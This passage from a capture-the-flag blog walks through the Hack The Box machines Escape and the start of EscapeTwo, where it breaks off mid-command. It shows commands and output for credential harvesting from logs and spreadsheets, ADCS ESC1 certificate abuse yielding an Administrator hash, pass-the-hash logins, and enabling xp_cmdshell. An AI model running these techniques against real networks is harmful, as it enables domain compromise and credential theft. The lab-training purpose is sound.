C:\\SQLServer\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         2/7/2023   8:06 AM                Logs\nd-----       11/18/2022   1:37 PM                SQLEXPR_2019\n-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe\n-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe\n</code></pre> <p>hm ok now we found some files, since inspecting/debugging the <code>.exe</code> files is a more difficult approach, i will try searching the <code>Logs</code> and <code>SQLEXPR_2019</code> folders first:</p> <p><code>Logs</code>:</p> <pre><code>Directory: C:\\SQLServer\\Logs\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK\n</code></pre> <p>contains an <code>.BAK</code> file, which is an extension used to signify a backup copy of a file, also lets download it and inspect it offline:</p> <pre><code>*Evil-WinRM* PS C:\\SQLServer\\Logs&gt; download ERRORLOG.BAK\n\nInfo: Downloading C:\\SQLServer\\Logs\\ERRORLOG.BAK to ERRORLOG.BAK\n\nInfo: Download successful!\n</code></pre> <p><code>ERRORLOG.BAK</code>:</p> <p>It contains large number of logs, but the most interesting ones were:</p> <pre><code>..........\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]\n</code></pre> <p>As we can see here, it contains SQL error log, the logs above show that user <code>Ryan.Cooper</code> failed to login once. After ryan\u2019s failed login, another user seems to fail <code>NuclearMosquito3</code> but by inspecting earlier the valid user i did not see that user anywhere! What if this username was a mistype by ryan and provided his password instead of his username? Lets find out:</p>"},{"location":"ch3ckm8_HTB_Escape/#checking-where-we-can-login-with-ryans-creds","title":"Checking where we can login with ryan\u2019s creds","text":"<pre><code>./auto_netexec_bulk_creds_checker.sh sequel.htb 'Ryan.Cooper' 'NuclearMosquito3'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on sequel.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nWINRM       10.129.228.253  5985   DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)\n\n[*] Checking if smb port 445 is open on sequel.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.253  445    DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 \n\n[*] Checking if ldap port 389 is open on sequel.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)\nLDAPS       10.129.228.253  636    DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3 \n\n[*] Checking if rdp port 3389 is open on sequel.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on sequel.htb...\n[-] Skipping wmi \u2014 port 135 is closed\n\n[*] Checking if nfs port 2049 is open on sequel.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on sequel.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on sequel.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on sequel.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on sequel.htb...\n[+] Port 1433 open \u2014 checking mssql with netexec\nMSSQL       10.129.228.253  1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)\nMSSQL       10.129.228.253  1433   DC               [+] sequel.htb\\Ryan.Cooper:NuclearMosquito3\n</code></pre> <p>great! it appears ryan can login to <code>winrm</code> with those creds</p> <pre><code>evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3\n</code></pre> <p>grabbed user flag! <code>c139f30e7a999df9e9d0cb0887b679eb</code></p> <p>proof:</p> <p></p>"},{"location":"ch3ckm8_HTB_Escape/#privesc","title":"Privesc","text":"<p>Folder structure:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper&gt; tree /f /a\nFolder PATH listing\nVolume serial number is EB33-4140\nC:.\n+---3D Objects\n+---Contacts\n+---Desktop\n|       user.txt\n|\n+---Documents\n+---Downloads\n+---Favorites\n|   |   Bing.url\n|   |\n|   \\---Links\n+---Links\n|       Desktop.lnk\n|       Downloads.lnk\n|\n+---Music\n+---Pictures\n+---Saved Games\n+---Searches\n\\---Videos\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#find-domain-groups","title":"Find domain groups:","text":"<pre><code>net group /domain\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper&gt; net group /domain\n\nGroup Accounts for \\\\\n\n-------------------------------------------------------------------------------\n*Cloneable Domain Controllers\n*DnsUpdateProxy\n*Domain Admins\n*Domain Computers\n*Domain Controllers\n*Domain Guests\n*Domain Users\n*Enterprise Admins\n*Enterprise Key Admins\n*Enterprise Read-only Domain Controllers\n*Group Policy Creator Owners\n*Key Admins\n*Protected Users\n*Read-only Domain Controllers\n*Schema Admins\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#current-users-group-membership","title":"Current user\u2019s Group membership","text":"<pre><code>whoami /groups\n</code></pre> <pre><code>GROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes\n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\n</code></pre> <p>the one group i found interesting here was <code>BUILTIN\\Certificate Service DCOM Access</code></p>"},{"location":"ch3ckm8_HTB_Escape/#current-users-privileges","title":"Current user\u2019s privileges:","text":"<pre><code>whoami /priv\n</code></pre> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre> <p>Lets try running bloodhound first to get a better picture of the AD:</p>"},{"location":"ch3ckm8_HTB_Escape/#bloodhound-as-ryan","title":"Bloodhound as ryan","text":"<pre><code>bloodhound-python -u 'ryan.cooper' -p 'NuclearMosquito3' -d sequel.htb -ns 10.129.228.253 -c All --zip\n</code></pre> <p>it was successful, lets dive in</p> <p><code>Ryan.Cooper</code> has no <code>OUTBOUND OBJECT CONTROL</code></p> <p></p> <p>and his <code>Group Membership</code> also provides nothing interesting</p> <p></p> <p>Since ryan has nothing further valuable here, we could inspect other objects:</p> <p>For example, we can view the <code>Domain Users</code>:</p> <p></p> <p>By greater inspection to all of them, found no obvious attack paths\u2026.</p> <p>Okay, lets take a break and think again, what do we already know about our user?</p> <p>For example, our user is member of <code>CERTIFICATE SERVICE DCOM ACCESS@SEQUEL.HTB</code> group, what does that mean? </p> <p>Well just by reading the name of this group it is obvious that certificates are involved, and since certificates are involved, this means that <code>Active Directory Certificate Service (AD CS)</code> exists.</p> <p>So why not try <code>enumerate AD CS</code>? lets try:</p>"},{"location":"ch3ckm8_HTB_Escape/#enumerate-adcs","title":"Enumerate ADCS","text":"<pre><code>certipy find -u \"Ryan.Cooper@sequel.htb\" -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout\n</code></pre> <p>from the output, scroll down on the Vulnerabilities section:</p> <pre><code>[!] Vulnerabilities\n      ESC1      : 'SEQUEL.HTB\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>nice!, it seems its vulnerable to <code>ESC1</code> ! this should be our attack path</p>"},{"location":"ch3ckm8_HTB_Escape/#abusing-esc1","title":"Abusing ESC1","text":"<p>There are multiple ways to do this, one is described here (via certify and rubeus) https://bloodhound.specterops.io/resources/edges/adcs-esc1</p> <p>I preferred using certipy since i was more familiar with it:</p>"},{"location":"ch3ckm8_HTB_Escape/#1-request-pfx-certificate","title":"1. Request pfx certificate","text":"<p>first lets sync with the DC</p> <pre><code>sudo ntpdate sequel.htb\n</code></pre> <p>then use certipy</p> <pre><code>certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication\n</code></pre> <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 14\n[*] Got certificate with UPN 'administrator@sequel.htb'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>this saved the <code>administrator.pfx</code> </p>"},{"location":"ch3ckm8_HTB_Escape/#2-get-tgt-hash-from-the-certificate","title":"2. Get TGT hash from the certificate","text":"<pre><code>certipy auth -pfx administrator.pfx\n</code></pre> <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee\n</code></pre> <p>Great! we got the NTLM hash of the Administrator, now lets login with winrm</p>"},{"location":"ch3ckm8_HTB_Escape/#login-as-administrator-via-pass-the-hash","title":"Login as Administrator via pass the hash","text":"<pre><code>evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee\n</code></pre> <p>grabbed root flag! <code>9cdc0e5182e2e2d9e3ad692973a0d597</code></p> <p>proof</p> <p></p> <p>Folder structure:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator&gt; tree /f /a\nFolder PATH listing\nVolume serial number is EB33-4140\nC:.\n+---.azuredatastudio\n|   |   argv.json\n|   |\n|   \\---extensions\n+---3D Objects\n+---Contacts\n+---Desktop\n|       root.txt\n|\n+---Documents\n|   +---SQL Server Management Studio\n|   |   \\---Code Snippets\n|   |       \\---SQL\n|   |           \\---My Code Snippets\n|   \\---Visual Studio 2017\n|       \\---Templates\n|           +---ItemTemplates\n|           |   +---JavaScript\n|           |   \\---TypeScript\n|           \\---ProjectTemplates\n|               +---JavaScript\n|               \\---TypeScript\n+---Downloads\n+---Favorites\n|   |   Bing.url\n|   |\n|   \\---Links\n+---Links\n|       Desktop.lnk\n|       Downloads.lnk\n|\n+---Music\n+---Pictures\n+---Saved Games\n+---Searches\n\\---Videos\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>"},{"location":"ch3ckm8_HTB_Escape/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; found multiple services to focus on, like <code>RPC</code>, <code>SMB</code>, <code>LDAP</code></li> <li>RPC enumeration \u2192 nothing useful</li> <li>SMB enumeration revealed <code>share</code> containing a pdf file, containing credentials</li> <li>LDAP enumeration \u2192 nothing useful</li> <li>Correlated the pdf file\u2019s credentials with the <code>MSSQL</code> service</li> <li><code>MSSQL</code> enumeration \u2192 revealed databases but nothing further interesting</li> </ol>"},{"location":"ch3ckm8_HTB_Escape/#foothold_1","title":"Foothold","text":"<ol> <li>Leaked NTLM hash via making MSSQL connect to my host and responder (capture hash) revealing the NTLM hash of a user (sql_svc)</li> <li>Logged in as a user (sql_svc)</li> <li>Enumerated Files and folders, found <code>SQL error logs</code> file containing plaintext creds for another user (ryan.cooper)</li> <li>logged in winrm as user ryan.cooper</li> <li>grabbed user flag</li> </ol>"},{"location":"ch3ckm8_HTB_Escape/#privesc_1","title":"Privesc","text":"<ol> <li>Group membership of the user indicated <code>ADCS</code> existence</li> <li>Enumerated <code>ADCS</code>, found it vulnerable to <code>ESC1</code></li> <li>Abused <code>ESC1</code>, got administrator\u2019s <code>pfx</code> and extracted the <code>NTLM</code> hash</li> <li>Logged in as administrator via the <code>NTLM</code> hash</li> <li>grabbed root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Escape/#flow-chart","title":"Flow chart","text":"<pre><code>flowchart TD\n    %% Reconnaissance\n    subgraph Reconnaissance\n        style Reconnaissance fill:blue,stroke:blue,stroke-width:2px\n        R1[Nmap Scan \u2192 Found multiple services: &lt;b&gt;RPC&lt;/b&gt;, &lt;b&gt;SMB&lt;/b&gt;, &lt;b&gt;LDAP&lt;/b&gt;]\n        R2[&lt;b&gt;RPC Enumeration&lt;/b&gt; \u2192 nothing useful]\n        R3[&lt;b&gt;SMB Enumeration&lt;/b&gt; \u2192 share with PDF containing &lt;b&gt;credentials&lt;/b&gt;]\n        R4[&lt;b&gt;LDAP Enumeration&lt;/b&gt; \u2192 nothing useful]\n        R5[Correlated PDF &lt;b&gt;credentials&lt;/b&gt; with &lt;b&gt;MSSQL&lt;/b&gt; service]\n        R6[&lt;b&gt;MSSQL Enumeration&lt;/b&gt; \u2192 databases found, nothing further]\n\n        R1 --&gt; R2\n        R1 --&gt; R3\n        R1 --&gt; R4\n        R3 --&gt; R5\n        R5 --&gt; R6\n\n        style R1 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white\n        style R2 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white\n        style R3 fill:deepskyblue,stroke:blue,stroke-width:1px,color:white\n        style R4 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white\n        style R5 fill:limegreen,stroke:green,stroke-width:1px,color:white\n        style R6 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white\n    end\n\n    %% Foothold\n    subgraph Foothold\n        style Foothold fill:orange,stroke:darkorange,stroke-width:2px\n        F1[Leaked &lt;b&gt;NTLM hash&lt;/b&gt; via &lt;b&gt;MSSQL&lt;/b&gt; \u2192 capture hash of &lt;b&gt;sql_svc&lt;/b&gt;]\n        F2[Logged in as &lt;b&gt;sql_svc&lt;/b&gt;]\n        F3[Enumerated files/folders \u2192 SQL error logs with &lt;b&gt;creds&lt;/b&gt; for &lt;b&gt;ryan.cooper&lt;/b&gt;]\n        F4[Logged in via &lt;b&gt;WinRM&lt;/b&gt; as &lt;b&gt;ryan.cooper&lt;/b&gt;]\n        F5[Grabbed &lt;b&gt;user flag&lt;/b&gt;]\n\n        F1 --&gt; F2\n        F2 --&gt; F3\n        F3 --&gt; F4\n        F4 --&gt; F5\n\n        style F1 fill:orangered,stroke:red,stroke-width:1px,color:white\n        style F2 fill:darkorange,stroke:red,stroke-width:1px,color:white\n        style F3 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white\n        style F4 fill:limegreen,stroke:green,stroke-width:1px,color:white\n        style F5 fill:gold,stroke:darkgoldenrod,stroke-width:1px,color:black\n    end\n\n    %% Privilege Escalation\n    subgraph Privilege_Escalation\n        style Privilege_Escalation fill:gray,stroke:black,stroke-width:2px\n        P1[&lt;b&gt;ryan.cooper&lt;/b&gt; group membership \u2192 indicates &lt;b&gt;ADCS&lt;/b&gt; existence]\n        P2[Enumerated &lt;b&gt;ADCS&lt;/b&gt; \u2192 vulnerable to &lt;b&gt;ESC1&lt;/b&gt;]\n        P3[Abused &lt;b&gt;ESC1&lt;/b&gt; \u2192 got admin &lt;b&gt;PFX&lt;/b&gt; \u2192 extracted &lt;b&gt;NTLM hash&lt;/b&gt;]\n        P4[Logged in as &lt;b&gt;Administrator&lt;/b&gt; via &lt;b&gt;NTLM hash&lt;/b&gt;]\n        P5[Grabbed &lt;b&gt;root flag&lt;/b&gt;]\n\n        P1 --&gt; P2\n        P2 --&gt; P3\n        P3 --&gt; P4\n        P4 --&gt; P5\n\n        style P1 fill:red,stroke:darkred,stroke-width:1px,color:white\n        style P2 fill:orangered,stroke:red,stroke-width:1px,color:white\n        style P3 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white\n        style P4 fill:limegreen,stroke:green,stroke-width:1px,color:white\n        style P5 fill:gold,stroke:darkgoldenrod,stroke-width:1px,color:black\n    end\n\n    %% Connect phases\n    R6 --&gt; F1\n    F5 --&gt; P1\n</code></pre>"},{"location":"ch3ckm8_HTB_Escape/#sidenotes","title":"Sidenotes","text":"<p>To sump up, Escape was a medium difficulty machine, leveraging basic enumeration and MSSQL for the foothold part, and ADCS abuse via ESC1 vulnerability for the privesc. </p> <p>This one will contribute to my knowledge mainly for the MSSQL and ADCS (ESC1) abuse parts.</p> <p></p>"},{"location":"ch3ckm8_HTB_EscapeTwo/","title":"EscapeTwo","text":""},{"location":"ch3ckm8_HTB_EscapeTwo/#intro","title":"Intro","text":"<p>This is a WINDOWS machine of easy difficulty, named EscapeTwo, lets begin</p> <p></p> <p>Machine Information: <pre><code>As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su, so its an assumed breach scenario\n</code></pre></p> <p>[[windows]] [[AD]] [[AssumedBreach]]  [[certificates]] [[certvulntemplate]] [[OSCPpath]]</p> <p>Tags: #windows #AD #AssumedBreach  #certificates #certvulntemplate #OSCPpath  Tools used:  Bloodhound, bloodhound-python, impacket-mssqlclient, bloodyAD,  impacket-dacledit,  nxc (netexec),  crackmapexec winrm, certipy-ad evil-winrm</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#reconnaissance","title":"Reconnaissance","text":"<p>add machine to etc/hosts <pre><code>echo '10.10.11.51 EscapeTwo.htb' | sudo tee -a /etc/hosts\n</code></pre></p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#nmap-scan","title":"Nmap scan","text":"<pre><code>nmap EscapeTwo.htb -sV -Pn -T4\n</code></pre> <p>output <pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 18:41 EDT\nNmap scan report for EscapeTwo.htb (10.10.11.51)\nHost is up (0.047s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-06 22:42:29Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 54.20 seconds\n</code></pre></p> <p>First, lets understand what each port is associated with what service: - 53 -&gt; port used for Domain Name Services, or DNS. DNS Servers are used to communicate with a web client and translate domain names to IP addresses. Most organizations will utilize DNS to make it easier for the different users to reach devices without needing to memorize IP addresses. - 88 -&gt; used to give users access to the Kerberos authentication protocol. This allows access to privileged network resources using tickets given by the server. - 135 -&gt; used for Remote Procedure Call or RPC. RPC is a Windows service relied upon by many services like AD to allow for remote client-server communications - 139 -&gt; SMB for file and printer sharing over NetBIOS, running over TCP/IP. This setup is typical in older versions of Windows and in various Unix systems, stack-wise, SMB is on top of NetBIOS if you are to imagine it with the OSI model. - 389 -&gt; Focuses around Lightweight Directory Access Protocol, or LDAP. LDAP allows clients to access protected network resources. Port 389 allows an unencrypted connection to LDAP. - 445\u00a0-&gt; SMB Server Message Block (SMB) protocol, which allows you to share resources such as files and printers within a network using TCP. Also used for direct SMB communications without the need for NetBIOS (so basically port 139 is SMB with NetBIOS, and port 445 is SMB without NetBIOS) - 464 -&gt; \u00a0Similar to port 88, port 464 is used to interact with Kerberos. Port 464, however, is specifically used for password changes within Microsoft Active Directory (AKA Entra), as Kerberos is the native authentication protocol of Entra. - 593 -&gt; RPC : used when clients need to connect to servers remotely\u00a0using the RPC Mapper Service - 636 -&gt; secure LDAP (Lightweight Directory Access Protocol) connections. Allows users to interact with LDAP, however it uses an encrypted connection. This encryption is generated by SSL/TLS, so you will often see port 636 as connecting to LDAPS. - 3268 &amp; 3269 -&gt; also connect to services via LDAP, however they are specific to the global catalog. Port 3268 is the unencrypted connection and port 3269 is for encrypted connections. - 1433 -&gt; SQL server default port communication - 5985 -&gt; WinRM , Windows Remote Management over HTTP</p> <p>Now lets group by ports per associated service:</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#dns-domain-name-system","title":"\ud83d\udfe3 DNS (Domain Name System)","text":"<ul> <li>53 \u2192 Translates domain names to IP addresses for web clients</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#kerberos","title":"\ud83d\udd35 Kerberos","text":"<ul> <li>88 \u2192 Standard Kerberos authentication (ticket granting)</li> <li>464 \u2192 Used for password changes (e.g., in Active Directory environments)</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#rpc-remote-procedure-call","title":"\ud83d\udfe0 RPC (Remote Procedure Call)","text":"<ul> <li>135 \u2192 RPC endpoint mapper (core service for RPC communication)</li> <li>593 \u2192 RPC over HTTP (used for remote management scenarios)</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#smb-server-message-block","title":"\ud83d\udfe2 SMB (Server Message Block)","text":"<ul> <li>139 \u2192 SMB over NetBIOS (legacy SMB communication)</li> <li>445 \u2192 SMB over TCP (modern direct SMB without NetBIOS)</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#ldap-lightweight-directory-access-protocol","title":"\ud83d\udfe4 LDAP (Lightweight Directory Access Protocol)","text":"<ul> <li>389 \u2192 Standard (unencrypted) LDAP</li> <li>636 \u2192 Secure LDAP (LDAPS) over SSL/TLS</li> <li>3268 \u2192 Global catalog over LDAP (unencrypted)</li> <li>3269 \u2192 Global catalog over LDAPS (encrypted)</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#winrm-windows-remote-management","title":"\ud83d\udd36 WinRM (Windows Remote Management)","text":"<ul> <li>5985 \u2192 WinRM over HTTP</li> </ul>"},{"location":"ch3ckm8_HTB_EscapeTwo/#sql-server","title":"\ud83d\udd34 SQL Server","text":"<ul> <li>1433 \u2192 Default port for Microsoft SQL Server</li> </ul> <p>We now have to decide which service (port) to target, the one that stands out to me as a more logical starting point is SMB, lets continue..</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#few-things-about-netbios-and-smb","title":"(Few things about NetBIOS and SMB)","text":"<p>I found a reddit comment below that to me makes the relationship between NetBIOS and SMB clear: - NetBIOS is an API. It gives a generic way for a software program to communicate with another computer on a network, without having to know the details of how the two computers will actually talk to each other.  - NetBIOS is a simple and general purpose networking tool. The NetBIOS API has only simple commands: connect to a computer, send data to a computer, receive data from a computer. It is up to the clients and servers that use the NetBIOS API to decide how to interpret the data they send and receive - NetBIOS is not a protocol. The NetBIOS API does not specify how two implementations of NetBIOS will actually talk to each other over a network. So for two implementations of NetBIOS to communicate, they have to support a common network protocol. Some common protocols for NetBIOS APIS to use are NetBEUI and NetBIOS-over-TCP.</p> <ul> <li>SMB is a protocol. It specifies the specific format of the data that computers will send to each other the network.</li> <li>SMB is primarily designed for file sharing and printer sharing. It is not intended as a general purpose networking tools</li> <li>SMB is not an API. SMB does not specify how a program can actually send an SMB command to another computer. It only specifies the format of the command.</li> </ul> <p>The NetBIOS API and the SMB protocol are generally used together as follows: - An SMB client will use the NetBIOS API to send an SMB command to an SMB server, and to listen for replies from the SMB server. - An SMB server will use the NetBIOS API to listen for SMB commands from SMB clients, and to send replies to the SMB client</p> <p>But there is nothing requiring that NetBIOS and SMB be used together. An SMB client and SMB server could use other APIs too. Likewise, any network client and server could use the NetBIOS API to communicate with each other.</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#smb-enumeration","title":"SMB enumeration","text":"<p>According to the machine's description, we are given creds for an account:  rose / KxEPkKe6R8su</p> <p>Lets start enumerating shares with smb client <pre><code>smbclient -U rose -L EscapeTwo.htb\n</code></pre></p> <p>we get this output <pre><code>Sharename              Type      Comment\n---------              ----      -------\nAccounting Department  Disk      \nADMIN$                 Disk      Remote Admin\nC$                     Disk      Default share\nIPC$                   IPC       Remote IPC\nNETLOGON               Disk      Logon server share \nSYSVOL                 Disk      Logon server share \nUsers                  Disk \n</code></pre></p> <p>by observing the share names, the one that seems different is \"Accounting Department\", lets check its content's: <pre><code>smbclient -U rose //EscapeTwo.htb/Accounting\\ Department\n</code></pre></p> <p><pre><code>smb: \\&gt; ls\n  .                                   D        0  Sun Jun  9 06:52:21 2024\n  ..                                  D        0  Sun Jun  9 06:52:21 2024\n  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024\n  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024\n\n                6367231 blocks of size 4096. 464430 blocks available\n</code></pre> hm interesting.. we found 2 xls files, lets download them locally to start inspecting: <pre><code>get accounting_2024.xlsx\nget accounts.xlsx\n</code></pre> inside the accounting_2024.xlsx, i found the creds below for multiple users <pre><code>Angela -&gt; 0fwz7Q4mSpurlt99\n0scar -&gt; 86LxLBMgEWaKUnBG\nkevin:-&gt; Md9Wlq1E5bZnVDVo\nsa -&gt; MSSQLP@ssw0rd!\n</code></pre> also inside the xls file, according to the user's email addresses, it appears to be related to mssql service (@sequel.htb format, i guess its a hint for mssql service)</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#valuable-info","title":"valuable info","text":"<p>user sa, is the default administrator account that connects and manages MSSQL databases</p> <p>add sequel.htb to /etc/hosts <pre><code>echo '10.10.11.51 sequel.htb' | sudo tee -a /etc/hosts\n</code></pre></p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#foothold","title":"Foothold","text":"<p>Now that we have some creds, we can try executing xp_cmdshell: <pre><code>impacket-mssqlclient -port 1433 sequel.htb/sa:'MSSQLP@ssw0rd!'@EscapeTwo.htb\n</code></pre> aand we are in, now i am about to run 3 commands (one by one), that should allow us to run any command: <pre><code>EXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\nxp_cmdshell \"whoami\"\n</code></pre></p> <pre><code>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (sa  dbo@master)&gt; EXEC sp_configure 'xp_cmdshell', 1;\nERROR(DC01\\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.\nSQL (-@master)&gt; RECONFIGURE;\nERROR(DC01\\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.\nSQL (sa  dbo@master)&gt; xp_cmdshell \"whoami\"\nERROR(DC01\\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.\n</code></pre> <p>After some searching through the directories, i came accross a configuration file (.ini)  <pre><code>xp_cmdshell \"type C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI\"\n</code></pre> and by viewing it, a cleartext pass can be seen, related to the sqlsvc account <pre><code>WqSZAF6CysDQbGb3\n</code></pre> then i tried logging in with evil-winrm as sql_svc with the pass i found, but no luck...</p> <p>(ch3ckm8)        (table)</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#_1","title":"(\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b","text":"<p>So here, we got a pass, but we dont know which username is associated with it, lets do some password spraying to find a list of usernames using netexec tool <pre><code>nxc smb EscapeTwo.htb -u 'rose' -p 'KxEPkKe6R8su' --rid-brute\n</code></pre></p> <p>i placed the users on a txt file, and then used crackmapexec for winrm <pre><code>crackmapexec winrm $TAR -u usernames.txt -p 